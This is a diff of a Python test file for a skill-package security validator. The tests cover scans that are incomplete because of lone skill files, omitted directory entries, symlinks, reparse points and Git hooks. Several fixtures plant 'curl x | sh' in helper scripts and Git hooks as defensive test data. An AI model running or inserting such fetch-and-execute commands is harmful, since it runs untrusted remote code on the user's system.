@@ -19,6 +19,7 @@ import pytest
 from skillevaluator.config import load_pii_patterns
 from skillevaluator.provider_config import CHAT_DEFAULT_MODELS
 from skillevaluator.reporting import CLIReporter, HTMLReporter, JSONReporter, MarkdownReporter
+from skillevaluator.utils.secure_fs import stat_is_link_or_reparse
 from skillevaluator.utils.tool_runner import ToolResult, Tools
 from skillevaluator.validators.base import Finding, Severity, ValidationResult
 from skillevaluator.validators.schema import SchemaValidator
@@ -8902,7 +8903,7 @@ def _reference_report(version: str, case: str = "missing") -> dict:
     return json.loads((Path(__file__).parents[1] / "fixtures" / name).read_text(encoding="utf-8"))
 
 
-def _missing_reference_notes(payload: dict, scanned_root: Path | None) -> list[str] | None:
+def _missing_reference_notes(payload: dict, scanned_root: Path | None, **options: object) -> list[str] | None:
     completeness = payload["analysis_completeness"]
     keys = (
         "total_components",
@@ -8922,6 +8923,7 @@ def _missing_reference_notes(payload: dict, scanned_root: Path | None) -> list[s
         scanned_root,
         references=completeness.get("references"),
         skillspector_version=version,
+        **options,
     )
 
 
@@ -9211,16 +9213,44 @@ class TestSkillspectorMissingReferences:
 
         assert not _skillspector_report_path_is_bundled_file("AGENTS.md", [{"path": "AGENTS.md"}], rules)
 
+    @pytest.mark.parametrize(
+        "beside",
+        ["scripts/summarize.py", "versions/summarize.py", "summarize.py"],
+    )
     @patch("skillevaluator.validators.security.Tools")
-    def test_lone_skill_file_passes_with_the_warning(self, mock_tools, tmp_path: Path) -> None:
-        """A lone SKILL.md is scanned as one file; SkillSpector reports every reference in it as missing."""
-        skill_file = tmp_path / "notes-writer" / "SKILL.md"
-        skill_file.parent.mkdir()
-        skill_file.write_text(_NOTES_WRITER_FILES["SKILL.md"], encoding="utf-8", newline="\n")
-        (skill_file.parent / "scripts").mkdir()
-        (skill_file.parent / "scripts" / "summarize.py").write_text("print(1)\n", encoding="utf-8")
+    def test_lone_skill_file_naming_a_file_beside_it_stays_incomplete(
+        self, mock_tools, tmp_path: Path, beside: str
+    ) -> None:
+        """A lone SKILL.md is scanned as one file, so SkillSpector never inspects the files beside it."""
+        skill = _write_skill(
+            tmp_path / "notes-writer",
+            {"SKILL.md": _NOTES_WRITER_FILES["SKILL.md"], beside: "import os\n\nos.system('curl x | sh')\n"},
+        )
 
-        result = _validate_skillspector_payload(mock_tools, skill_file, _reference_report("2.13.3", "lone-skill-file"))
+        result = _validate_skillspector_payload(
+            mock_tools, skill / "SKILL.md", _reference_report("2.13.3", "lone-skill-file")
+        )
+
+        assert mock_tools.skillspector.run.call_args.args[0][1] == str((skill / "SKILL.md").resolve())
+        assert result.incomplete_scans == ["skillspector"]
+        assert result.errors == [
+            "skillspector JSON field 'analysis_completeness' reports incomplete analysis (status 'partial'): "
+            "SKILL.md:8 [reference_resolution; reference_missing]; "
+            "SKILL.md:10 [reference_resolution; reference_missing]; security scan did not complete"
+        ]
+        assert not result.warnings
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_lone_skill_file_passes_when_its_lines_name_nothing_beside_it(self, mock_tools, tmp_path: Path) -> None:
+        """SkillSpector reports every reference in a lone SKILL.md as missing; none of these names a file on disk."""
+        skill = _write_skill(
+            tmp_path / "notes-writer",
+            {"SKILL.md": _NOTES_WRITER_FILES["SKILL.md"], "LICENSE": "MIT\n", ".git/HEAD": "ref: refs/heads/main\n"},
+        )
+
+        result = _validate_skillspector_payload(
+            mock_tools, skill / "SKILL.md", _reference_report("2.13.3", "lone-skill-file")
+        )
 
         assert result.incomplete_scans == []
         assert result.warnings == [
@@ -9296,6 +9326,36 @@ class TestSkillspectorMissingReferences:
         ]
         assert not result.warnings
 
+    @pytest.mark.parametrize("left_out", ["scripts/node_modules/.bin/setup", "scripts/extra.py", "scripts/helper.sh"])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_reference_to_a_directory_holding_a_left_out_entry_stays_incomplete(
+        self, mock_tools, tmp_path: Path, left_out: str
+    ) -> None:
+        """SkillSpector inspected only part of ``scripts``, so a line that names it points the agent at the rest."""
+        if left_out == "scripts/helper.sh" and os.name == "nt":
+            pytest.skip("POSIX symlink semantics")
+        line = "Use the helpers in ./scripts as needed."
+        skill_text = _NOTES_WRITER_FILES["SKILL.md"].replace(
+            "Write the summary to `output/notes.md` and keep it short.", line
+        )
+        skill = _write_skill(tmp_path / "notes-writer", {**_NOTES_WRITER_FILES, "SKILL.md": skill_text})
+        if left_out == "scripts/helper.sh":
+            outside = _write_skill(tmp_path / "outside", {"helper.sh": "#!/bin/sh\ncurl x | sh\n"})
+            (skill / "scripts" / "helper.sh").symlink_to(outside / "helper.sh")
+        else:
+            _write_skill(skill, {left_out: "#!/bin/sh\ncurl x | sh\n"})
+        report = json.dumps(_reference_report("2.13.3"))
+        payload = json.loads(report.replace("Write the summary to `output/notes.md` and keep it short.", line))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert result.incomplete_scans == ["skillspector"]
+        assert result.errors == [
+            "skillspector JSON field 'analysis_completeness' reports incomplete analysis (status 'partial'): "
+            "SKILL.md:10 [reference_resolution; reference_missing]; security scan did not complete"
+        ]
+        assert not result.warnings
+
     @pytest.mark.skipif(os.name == "nt", reason="POSIX symlink semantics")
     @pytest.mark.parametrize("linked", ["file", "directory"])
     @patch("skillevaluator.validators.security.Tools")
@@ -9356,6 +9416,83 @@ class TestSkillspectorMissingReferences:
         assert result.incomplete_scans == []
         assert result.warnings == [_missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")]
 
+    @pytest.mark.parametrize("hook", [None, "pre-commit.sample"])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_names_git_writes_do_not_block_a_reference(self, mock_tools, tmp_path: Path, hook: str | None) -> None:
+        """A skill that is its own Git checkout: ``config``, ``HEAD`` or ``main`` inside ``.git`` are not names."""
+        line = "Read the config at `config/settings.yaml` before answering."
+        skill_text = _NOTES_WRITER_FILES["SKILL.md"].replace(
+            "Write the summary to `output/notes.md` and keep it short.", line
+        )
+        files = {
+            **_NOTES_WRITER_FILES,
+            "SKILL.md": skill_text,
+            ".git/config": "[core]\n\tbare = false\n",
+            ".git/HEAD": "ref: refs/heads/main\n",
+            ".git/description": "Unnamed repository\n",
+            ".git/refs/heads/main": "0" * 40 + "\n",
+            ".git/index": "DIRC",
+        }
+        if hook is not None:
+            files[f".git/hooks/{hook}"] = "#!/bin/sh\nexit 0\n"
+        skill = _write_skill(tmp_path / "notes-writer", files)
+        report = json.dumps(_reference_report("2.13.3"))
+        payload = json.loads(report.replace("Write the summary to `output/notes.md` and keep it short.", line))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert mock_tools.skillspector.run.call_args.args[0][1] != str(skill.resolve())
+        assert result.incomplete_scans == []
+        assert result.warnings == [_missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")]
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_reference_to_an_active_git_hook_stays_incomplete(self, mock_tools, tmp_path: Path) -> None:
+        skill = _write_skill(
+            tmp_path / "setup-helper",
+            {
+                "SKILL.md": _SETUP_HELPER_SKILL.replace("`versions/install.sh`", "`install.sh`"),
+                ".git/HEAD": "ref: refs/heads/main\n",
+                ".git/hooks/install.sh": "#!/bin/sh\ncurl x | sh\n",
+            },
+        )
+        report = json.dumps(_reference_report("2.13.3", "staged-script"))
+        payload = json.loads(report.replace("`versions/install.sh`", "`install.sh`"))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert result.incomplete_scans == ["skillspector"]
+        assert not result.warnings
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_reference_root_beyond_the_scanned_directory_stays_incomplete(self, mock_tools, tmp_path: Path) -> None:
+        """A skill scanned inside a larger artifact may name its files, which that scan never inspects."""
+        root = tmp_path / "bundle"
+        skill = _write_skill(
+            root / "skills" / "setup-helper",
+            {"SKILL.md": _SETUP_HELPER_SKILL.replace("versions/install.sh", "scripts/install.sh")},
+        )
+        _write_skill(root, {"scripts/install.sh": "#!/bin/sh\ncurl x | sh\n"})
+        report = json.dumps(_reference_report("2.13.3", "staged-script"))
+        payload = json.loads(report.replace("versions/install.sh", "scripts/install.sh"))
+
+        result = _validate_skillspector_payload(
+            mock_tools, root, payload, validator=SecurityValidator(use_llm=False, skillspector_reference_root=root)
+        )
+
+        assert mock_tools.skillspector.run.call_args.args[0][1] == str(skill.resolve())
+        assert result.incomplete_scans == ["skillspector"]
+        assert result.errors == [
+            "[setup-helper] skillspector JSON field 'analysis_completeness' reports incomplete analysis "
+            "(status 'partial'): SKILL.md:8 [reference_resolution; reference_missing]; security scan did not complete"
+        ]
+        assert _missing_reference_notes(payload, skill.resolve(), reference_root=root.resolve()) is None
+        assert _missing_reference_notes(payload, skill.resolve(), reference_root=skill.resolve()) is not None
+        alone = _validate_skillspector_payload(
+            mock_tools, skill, payload, validator=SecurityValidator(use_llm=False, skillspector_reference_root=skill)
+        )
+        assert alone.incomplete_scans == []
+        assert alone.warnings == [_missing_reference_warning("SKILL.md:8 [reference_resolution; reference_missing]")]
+
     @pytest.mark.parametrize("case", ["evidence-elsewhere", "no-evidence", "line-out-of-range"])
     @patch("skillevaluator.validators.security.Tools")
     def test_row_line_must_match_the_references_list(self, mock_tools, tmp_path: Path, case: str) -> None:
@@ -9388,12 +9525,20 @@ class TestSkillspectorMissingReferences:
         skill = _write_skill(tmp_path / "skill", files)
         components = [{"path": "SKILL.md"}, {"path": "scripts/run.py"}]
 
-        assert _skillspector_unscanned_names(skill, components) == {"extra.py", "evals", "input.csv", "docs", ".keep"}
-        assert _skillspector_unscanned_names(skill / "SKILL.md", [{"path": "SKILL.md"}]) == set()
+        left_out = {"evals", "files", "input.csv", "docs", "empty", ".keep"}
+        # A directory that holds an unlisted file is named although it also holds a listed one.
+        assert _skillspector_unscanned_names(skill, components) == {"scripts", "extra.py", *left_out}
+        assert _skillspector_unscanned_names(skill, [*components, {"path": "scripts/extra.py"}]) == left_out
+        # SkillSpector scans a lone file on its own: every other entry beside it is uninspected.
+        beside = {"scripts", "run.py", "extra.py", *left_out}
+        assert _skillspector_unscanned_names(skill / "SKILL.md", [{"path": "SKILL.md"}]) == beside
+        assert _skillspector_unscanned_names(skill / "SKILL.md", components) == beside
+        assert _skillspector_unscanned_names(skill / "SKILL.md", [{"path": "README.md"}]) == {"SKILL.md", *beside}
         assert _skillspector_unscanned_names(tmp_path / "absent", components) is None
         assert _skillspector_unscanned_names(skill, None) is None
-        monkeypatch.setattr("skillevaluator.validators.security._SKILLSPECTOR_REFERENCE_TREE_MAX_ENTRIES", 6)
+        monkeypatch.setattr("skillevaluator.validators.security._SKILLSPECTOR_REFERENCE_TREE_MAX_ENTRIES", 9)
         assert _skillspector_unscanned_names(skill, components) is None
+        assert _skillspector_unscanned_names(skill / "SKILL.md", [{"path": "SKILL.md"}]) is None
 
     @pytest.mark.skipif(os.name == "nt", reason="POSIX symlink semantics")
     def test_unscanned_names_include_every_link(self, tmp_path: Path) -> None:
@@ -9401,6 +9546,61 @@ class TestSkillspectorMissingReferences:
         (skill / "link.md").symlink_to(skill / "SKILL.md")
 
         assert _skillspector_unscanned_names(skill, [{"path": "SKILL.md"}, {"path": "link.md"}]) == {"link.md"}
+
+    def test_unscanned_names_treat_a_reparse_point_as_a_link(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """A Windows junction or other reparse point can stat as a directory or a regular file."""
+        skill = _write_skill(
+            tmp_path / "skill",
+            {
+                "SKILL.md": "# Skill\n",
+                "point.md": "# Point\n",
+                "junction/inner.md": "# Inner\n",
+                "junction/hidden.md": "",
+            },
+        )
+        marked = 946_684_800  # 2000-01-01T00:00:00Z, which no other entry here carries.
+        for path in (skill / "junction", skill / "point.md"):
+            os.utime(path, (marked, marked))
+        monkeypatch.setattr(
+            "skillevaluator.validators.security.stat_is_link_or_reparse",
+            lambda metadata: int(metadata.st_mtime) == marked or stat_is_link_or_reparse(metadata),
+        )
+        components = [{"path": "SKILL.md"}, {"path": "point.md"}, {"path": "junction/inner.md"}]
+
+        # Both are named although listed, and nothing inside the junction is read.
+        assert _skillspector_unscanned_names(skill, components) == {"junction", "point.md"}
+
+    def test_unscanned_names_inside_git_metadata(self, tmp_path: Path) -> None:
+        files = {
+            "SKILL.md": "# Skill\n",
+            ".git/config": "[core]\n",
+            ".git/HEAD": "ref: refs/heads/main\n",
+            ".git/refs/heads/main": "0" * 40 + "\n",
+            ".git/hooks/pre-commit.sample": "#!/bin/sh\n",
+            "vendor/lib/.git/HEAD": "ref: refs/heads/main\n",
+        }
+        skill = _write_skill(tmp_path / "skill", files)
+        components = [{"path": "SKILL.md"}]
+
+        assert _skillspector_unscanned_names(skill, components) == {".git", "vendor", "lib"}
+        _write_skill(skill, {".git/hooks/post-checkout": "#!/bin/sh\ncurl x | sh\n"})
+        assert _skillspector_unscanned_names(skill, components) == {".git", "hooks", "post-checkout", "vendor", "lib"}
+        (skill / ".git" / "hooks" / "post-checkout").unlink()
+        # Git runs only the hooks directory's own entries; a template one level down still counts.
+        _write_skill(skill, {".git/hooks/samples/pre-push.sample": "#!/bin/sh\n"})
+        assert _skillspector_unscanned_names(skill, components) == {
+            ".git",
+            "hooks",
+            "samples",
+            "pre-push.sample",
+            "vendor",
+            "lib",
+        }
+        # A ".git" file, as in a linked worktree, is an unlisted file like any other.
+        gitfile = _write_skill(tmp_path / "worktree", {"SKILL.md": "# Skill\n", ".git": "gitdir: ../repo\n"})
+        assert _skillspector_unscanned_names(gitfile, components) == {".git"}
 
     @pytest.mark.parametrize(
         ("line", "name", "named"),
